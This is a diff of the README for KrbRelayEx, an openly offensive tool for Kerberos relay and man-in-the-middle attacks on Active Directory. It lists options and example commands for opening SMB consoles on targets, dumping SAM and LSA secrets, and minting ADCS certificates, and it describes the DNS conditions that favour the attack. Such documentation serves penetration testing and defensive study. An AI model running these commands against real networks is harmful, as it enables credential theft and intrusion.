@@ -29,60 +29,67 @@ Credits: [cube0x0/KrbRelay](https://github.com/cube0x0/KrbRelay)
 
 ## Usage
 
-```bash
-KrbRelayEx.exe -spn <SPN> [OPTIONS] [ATTACK]
-SMB Attacks
-Option	Description
--console	Start an interactive SMB console
--bgconsole	Start a background SMB console via sockets
--list	List available SMB shares on the target system
--bgconsolestartport	Specify the starting port for background SMB console sockets
--secrets	Dump SAM & LSA secrets from the target system
-HTTP Attacks
-Option	Description
--endpoint <ENDPOINT>	Specify the HTTP endpoint to target (e.g., CertSrv)
--adcs <TEMPLATE>	Generate a certificate using the specified template
-Options
-Option	Description
--redirectserver <IP>	Specify the IP address of the target server for the attack
--ssl	Use SSL transport for secure communication
--spn <SPN>	Set the Service Principal Name (SPN) for the target service
--redirectports <PORTS>	Provide a comma-separated list of ports to forward (e.g., 3389,135,5985)
--smbport <PORT>	Specify the SMB port to listen on (default: 445)
-Examples
-Start an interactive SMB console
-bash
-Copy code
-KrbRelayEx.exe -spn SMB/target.domain.com -console -redirecthost <ip_target_host>
-List SMB shares on a target
-bash
-Copy code
-KrbRelayEx.exe -spn SMB/target.domain.com -list
-Dump SAM & LSA secrets
-bash
-Copy code
-KrbRelayEx.exe -spn SMB/target.domain.com -secrets -redirecthost <ip_target_host>
-Start a background SMB console on port 10000 upon relay
-bash
-Copy code
-KrbRelayEx.exe -spn SMB/target.domain.com -bgconsole -redirecthost <ip_target_host>
-Generate a certificate using ADCS with a specific template
-bash
-Copy code
-KrbRelayEx.exe -spn HTTP/target.domain.com -endpoint CertSrv -adcs UserTemplate -redirecthost <ip_target_host>
-Relay attacks with SSL and port forwarding
-bash
-Copy code
-KrbRelayEx.exe -spn HTTP/target.domain.com -ssl -redirectserver 192.168.1.50 -redirectports 3389,5985
-Notes
-Relaying Behavior:
-KrbRelayEx intercepts and relays the first authentication attempt, then switches to forwarder mode for all subsequent incoming requests. Press r anytime to restart relay mode.
+```
+        #############      KrbRelayEx by @decoder_it     ##############
+        # Kerberos Relay and Forwarder for (Fake) SMB MiTM Server     #
+        # v1.0 2024                                                   #
+        # Github: https://github.com/decoder-it/KrbRelayEx            #
+        # Credits: https://github.com/cube0x0/KrbRelay                #
+        ###############################################################
 
-DNS Manipulation:
-This tool is particularly effective if you can manipulate DNS names. Scenarios include:
+Description:
+  KrbRelayEx is a tool designed for performing Man-in-the-Middle (MitM) attacks and relaying Kerberos AP-REQ tickets.
+  It listens for incoming SMB connections and forward the AP-REQ to the target host, enabling access to SMB shares or HTTP ADCS (Active Directory Certificate Services endpoints)
+  The tool can span several SMB consoles, and the relaying process is completely transparent to the end user, who will seamlessly access the desired share.
 
-Being a member of the DNS Admins group.
-Having zones where unsecured DNS updates are allowed in Active Directory domains.
-Gaining control over HOSTS file entries on client computers.
-Background Consoles:
-Ideal for managing multiple SMB consoles simultaneously.
+Usage:
+  KrbRelayEx.exe -spn <SPN> [OPTIONS] [ATTACK]
+
+SMB Attacks:
+  -console                       Start an interactive SMB console
+  -bgconsole                     Start an interactive SMB console in background via sockets
+  -list                          List available SMB shares on the target system
+  -bgconsolestartport            Specify the starting port for background SMB console sockets (default: 10000)
+  -secrets                       Dump SAM & LSA secrets from the target system
+
+HTTP Attacks:
+  -endpoint <ENDPOINT>           Specify the HTTP endpoint to target (e.g., 'CertSrv')
+  -adcs <TEMPLATE>               Generate a certificate using the specified template
+
+Options:
+  -redirectserver <IP>           Specify the IP address of the target server for the attack
+  -ssl                           Use SSL transport for secure communication
+  -spn <SPN>                     Set the Service Principal Name (SPN) for the target service
+  -redirectports <PORTS>         Provide a comma-separated list of additional ports to forward to the target (e.g., '3389,135,5985')
+  -smbport <PORT>                Specify the SMB port to listen on (default: 445)
+
+Examples:
+  Start an interactive SMB console:
+    KrbRelay.exe -spn SMB/target.domain.com -console -redirecthost <ip_target_host>
+
+  List SMB shares on a target:
+    KrbRelay.exe -spn SMB/target.domain.com -list
+
+  Dump SAM & LSA secrets:
+    KrbRelay.exe -spn SMB/target.domain.com -secrets -redirecthost <ip_target_host>
+
+  Start a background SMB console on port 10000 upon relay:
+    KrbRelay.exe -spn SMB/target.domain.com -bgconsole -redirecthost <ip_target_host>
+
+  Generate a certificate using ADCS with a specific template:
+    KrbRelay.exe -spn HTTP/target.domain.com -endpoint CertSrv -adcs UserTemplate-redirecthost <ip_target_host>
+
+  Relay attacks with SSL and port forwarding:
+    KrbRelay.exe -spn HTTP/target.domain.com -ssl -redirectserver 192.168.1.50 -redirectports 3389,5985
+
+Notes:
+  - KrbRelayEx intercepts and relays the first authentication attempt,
+    then switches to forwarder mode for all subsequent incoming requests.
+    You can press any time 'r' for restarting relay mode
+
+  - This tool is particularly effective if you can manipulate DNS names. Examples include:
+    - Being a member of the DNS Admins group.
+    - Having zones where unsecured DNS updates are allowed in Active Directory domains.
+    - Gaining control over HOSTS file entries on client computers.
+
+  - Background consoles are ideal for managing multiple SMB consoles
